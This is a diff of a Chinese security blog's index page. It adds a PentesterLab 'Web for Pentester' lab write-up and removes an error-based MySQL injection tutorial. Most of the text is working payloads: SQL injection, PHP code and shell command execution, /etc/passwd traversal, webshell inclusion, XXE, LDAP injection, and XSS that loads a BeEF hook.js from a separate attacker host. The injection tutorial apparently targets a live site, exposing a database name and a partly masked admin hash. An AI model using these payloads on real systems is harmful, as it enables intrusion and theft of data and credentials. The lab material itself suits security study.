@@ -139,6 +139,109 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/25/web-for-pentester/">
+                web for pentester writeup
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/pentestlab/">pentestlab</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p>(1)没有任何过滤的拼接<br><img src="/img/sqli1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example1.php?name=root' and 1=12 union select version(),user(),database(),4,5 --+-</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli1_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)只过滤了空白符,用/**/代替即可<br><img src="/img/sqli2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example2.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=112/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,database(),3,4,5/</span>**<span class="regexp">/%23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli2_s.png" alt="&#39;&#39;"><br></p>
+<p>(3)跟上面一样,只不过这次过滤了多个空白符,bypass方法同上<br><img src="/img/sqli3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example3.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=12/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/user(),2,3,4,5/</span>**<span class="regexp">/%23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli3_s.png" alt="&#39;&#39;"><br></p>
+<p>(4)用mysql_real_escape_string()把传过来的id先转义再拼接,其实这里跟没任何过滤是一样的,因为我们的注入语句里根本也没有单引号这类敏感字符<br><img src="/img/sqli4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example4.php?id=2 and 12=1 union select 1,version(),3,4,5 %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli4_s.png" alt="&#39;&#39;"><br></p>
+<p>(5)要求开头是任意数字,开头本来就是数字呀,搞不懂,所以根本不存在什么绕过,正常写注入语句即可<br><img src="/img/sqli5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example5.php?id=2 and 1=12 union select version(),2,3,4,5 %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli5_s.png" alt="&#39;&#39;"><br></p>
+<p>(6)要求结尾是任意数字,那就按它说的呗,结尾随便给个数字就好了<br><img src="/img/sqli6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example6.php?id=2 and 1=12 union select version(),2,3,4,5 %233</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli6_s.png" alt="&#39;&#39;"><br></p>
+<p>(7)注意这里的’/m修饰符,对,没错,就是它,表示多行匹配,所以用%0a换行下即可绕过<br><img src="/img/sqli7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example7.php?id=2%0aand%0a1=112%0aunion%0aselect%0auser(),2,3,4,5%0a%23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli7_s.png" alt="&#39;&#39;"><br></p>
+<p>(8)用mysql_real_escape_string()做了下转义,而后再拼接,不过需要注意下,这里是用反引号闭合的,虽然没法正常注入,不过盲注依然可行的<br><img src="/img/sqli8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example8.php?order=name`,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli8_s.png" alt="&#39;&#39;"></p>
+<p>(9)同上,利用时间盲注依然是可行的<br><img src="/img/sqli9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example9.php?order=name,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/sqli9_s.png" alt="&#39;&#39;"><br><br></p>
+<h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行:"></a>php代码执行:</h2><p>(1)把没有任何过滤的内容就直接给eval,将前后的双引号闭合即可<br><img src="/img/code1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example1.php?name=";system('ls -la');phpinfo();/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/code1_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)同样,对传入的值没有任何过滤,crate_function()相必大家都已经非常熟悉了,专门用来组装函数,在以前的各类php代码执行漏洞中经常能看到它的影子,它会出现代码执行的根本原因还是它内部还会有个eval的动作<br><img src="/img/code2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example2.php?order=id,$b-&gt;name);&#125;system('ls -al');/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/code2_s.png" alt="&#39;&#39;"><br></p>
+<p>(3)preg_replace()本来是个挺正常的正则替换函数,但加了/e修正符后,瞬间就污了很多,要替换的内容的那一部分会被当做php代码来执行<br><img src="/img/code3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example3.php?new=system('ls -l')&amp;pattern=/lamer</span><span class="regexp">/e&amp;base=Hello lamer</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/code3_s.png" alt="&#39;&#39;"><br></p>
+<p>(4)闭合前面的单引号,再拼接自己的php代码即可,典型的代码执行函数assert(),不多说,大家应该非常熟悉了,各类php一句话中经常也能看到<br><img src="/img/code4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example4.php?name=hacker'.system('ls -la');/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/code4_s.png" alt="&#39;&#39;"><br><br><br></p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取:"></a>任意文件读取:</h2><p>(1)对传入的文件路径没有进行任何过滤,直接跟上要读的文件即可<br><img src="/img/dir.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example1.php?file=../</span>../../../etc/passwd</div></pre></td></tr></table></figure></p>
+<p><img src="/img/dir_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)把’/var/www/files/‘这个路径截掉,然后只取后面的文件名,绕过自然也很简单,在这个路径的基础上继续跟上正常的文件路径即可<br><img src="/img/dir1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../../etc/passwd</div></pre></td></tr></table></figure></p>
+<p><img src="/img/dir1_s.png" alt="&#39;&#39;"><br></p>
+<p>(3)拼接了个.png的后缀,%00截断后缀php高版本早已修复该漏洞<br><img src="/img/dir2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../../etc/passwd%<span class="number">00</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/dir2_s.png" alt="&#39;&#39;"><br><br></p>
+<h2 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含:"></a>php文件包含:</h2><p>(1)没有任何过滤的包含,直接包含本地的webshell即可,如下,被包含的大马正常执行<br><img src="/img/fileinc.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example1.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php</div></pre></td></tr></table></figure></p>
+<p><img src="/img/fileinc_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)在后面拼接了个.php的后缀,同样,利用%00截断<br><img src="/img/fileinc1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example2.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php%<span class="number">00</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/fileinc1_s.png" alt="&#39;&#39;"><br><br></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h2><p>(1)没有任何过滤的传入,在linux中可用分号分割连续执行多个命令,win中可用&amp;&amp;<br><img src="/img/cmd1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/cmd1_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)一眼看去,这个ip正则确实没法突破,但后面却紧跟了个/m修饰符,不得不又让我想起了%0a换行<br><img src="/img/cmd2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example2.php?ip=127.0.0.1%0als -la</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/cmd2_s.png" alt="&#39;&#39;"><br></p>
+<p>(3)header()后面竟然没有结束脚本,大忌,header()只是跳转到指定页面,但如果你不手工结束当前脚本,即使跳到别的页面,当前脚本也依然会执行完再退出<br><img src="/img/cmd3.png" alt="&#39;&#39;"><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.51/commandexec/example1.php?ip=127.0.0.1;ls -la</div><div class="line">C:\&gt;curl "192.168.3.51/commandexec/example3.php?ip=127.0.0.1;ls"   注意这里不能用浏览器了,因为它会跳过去,不过,你可以用curl来看结果</div></pre></td></tr></table></figure></p>
+<p><img src="/img/cmd3_s.png" alt="&#39;&#39;"><br><br></p>
+<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入:"></a>XXE注入:</h2><p>(1) 对外部的xml数据没有任何过滤,此时创建一个外部实体,而实体的作用是读取/etc/passwd文件,然后引用该实体,注意要url编码下<br><img src="/img/xxe.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=&lt;!DOCTYPE result [&lt;!ENTITY res SYSTEM "file:/</span><span class="regexp">//etc</span><span class="regexp">/passwd" &gt;]&gt;&lt;text&gt;&amp;res;&lt;/text</span>&gt;</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20result%20%5B%3C%21ENTITY%20res%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Ctext%3E%26res%3B%3C%2ftext%3E</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xxe_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)没有任何过滤的拼接<br><img src="/img/xxe1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example2.php?name=hacker'] | /</span><span class="regexp">/*| /</span><span class="regexp">/*['</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xxe1_s.png" alt="&#39;&#39;"><br><br><br><br></p>
+<h2 id="ladp注入"><a href="#ladp注入" class="headerlink" title="ladp注入:"></a>ladp注入:</h2><p>(1)ldap允许匿名登录<br><img src="/img/ldap.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example1.php</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ldap_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)闭合原有的过滤器,把后面的password截断即可<br><img src="/img/ldap2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example2.php?name=hacker)(cn=*))%00&amp;password=hacker</span></div></pre></td></tr></table></figure></p>
+<p><br><br></p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss:"></a>xss:</h2><p>(1)没有任何过滤的情况<br><img src="/img/xss1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example1.php?name=&lt;script&gt;alert('hello')&lt;/script</span>&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss1_s.png" alt="&#39;&#39;"><br></p>
+<p>(2)只过滤了’<script>‘和’</script>‘，大小写转换<br><img src="/img/xss2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example2.php?name=&lt;Script&gt;alert('hello')&lt;/s</span>Cript&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss2_s.png" alt="&#39;&#39;"><br></p>
+<p>(3)这次依然是过滤’<script></script>‘,且不区分大小写,在&gt;前面加个空格即可绕过<br><img src="/img/xss3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example3.php?name=&lt;ScripT &gt;alert('hello')&lt;/</span>Script &gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss3_s.png" alt="&#39;&#39;"><br></p>
+<p>(4)不分区大小写过滤了’script’字符,没关系,把它转成对应的ASCII就好了<br><img src="/img/xss4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example4.php?name=&lt;svg/onload</span>=<span class="string">"var i=String.fromCharCode(115, 99, 114, 105, 112, 116);s = createElement(i);body.appendChild(s);s.src='http://192.168.3.28:3000/hook.js';"</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss4_s.png" alt="&#39;&#39;"><br></p>
+<p>(5)过滤了alert,可惜我们都没用alert<br><img src="/img/xss5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example5.php?name=hacker&lt;script src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">"&gt;&lt;/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss5_s.png" alt="&#39;&#39;"><br></p>
+<p>(6)闭合前面的双引号,继续写js代码就好了<br><img src="/img/xss6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example6.php?name=script";s=document.createElement($a);s.src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">";document.getElementsByTagName( "</span>head<span class="string">" )[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss6_s.png" alt="&#39;&#39;"><br></p>
+<p>(7)对特特殊字符进行实体化,但这似乎并没能改变什么<br><img src="/img/xss7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example7.php?name=script';s=document.createElement($a);s.src='http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">';document.getElementsByTagName( '</span>head<span class="string">')[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss7_s.png" alt="&#39;&#39;"><br></p>
+<p>(8)闭合action的另一半双引号,后面再跟上script标记即可绕过<br><img src="/img/xss8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example8.php/</span><span class="string">"&gt;&lt;script&gt;alert('hello')&lt;/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss8_s.png" alt="&#39;&#39;"><br></p>
+<p>(9)location.hash.substr获取的内容没有任何过滤<br><img src="/img/xss9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example9.php#&lt;script src=http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js&gt;&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/xss9_s.png" alt="&#39;&#39;"><br><br></p>
+<h2 id="php文件上传"><a href="#php文件上传" class="headerlink" title="php文件上传:"></a>php文件上传:</h2><p>(1)没有任何过滤,直接传php,大马正常执行<br><img src="/img/upload1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example1.php</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/upload1_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload1_s_1.png" alt="&#39;&#39;"><br></p>
+<p>(2)黑名单绕过,只要.php后缀,.php3即可绕过<br><img src="/img/upload2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example2.php</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/upload2_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload2_s_1.png" alt="&#39;&#39;"><br><br><br><br></p>
+<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;闲的没事儿,拿来跑跑,没啥技术含量,顺带记录下,只为留给有需要的人</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/05/20/bypass-waf-note/">
                 bypass waf入门之sql注入篇 [ 内联注释 ]
             </a>
@@ -567,76 +670,6 @@
 <p>11,最终,得到的管理员账号密码完整数据如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">wexnepal:</span><span class="number">194</span>fb91445ebd552e7ab75457*****</div></pre></td></tr></table></figure></p>
 <p><br></p>
 <p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里只是简单说明了盲注里面的最基本的一种方法(基于布尔的盲注),另外还有基于时间和错误的盲注,思路流程几乎是一模一样的,同样是一位位字符的截取,只是用的函数不一样而已,换汤不换药,稍微改下语句即可,非常简单,这里就不再重复啰嗦了,大家可以看到,既是是盲注,也并不是什么很高深的注入技术,所有的复杂都是基础堆积的结果,最多可能只是在这之前,大家都没想到原来还可以这么查数据而已,可能有些繁琐,但语句还是非常好理解的,关键在于大家对各种数据库单行函数的理解和灵活应用,自己要记得多实践,以不断加深自己对盲注的理解,另外,如果真的是手工这样猜,肯定会累死,实际中我们更多都是配合burpsuite一起来完成整个过程<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/05/13/mysql-error-injection/">
-                sql注入入门 之 mysql 显错注入 [ floor()显错 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-05-13</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/all-sql-injection/">all sql injection</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
-<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
-<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
-<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
-<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
-<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
-<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
-<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
-<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
-<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
-<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
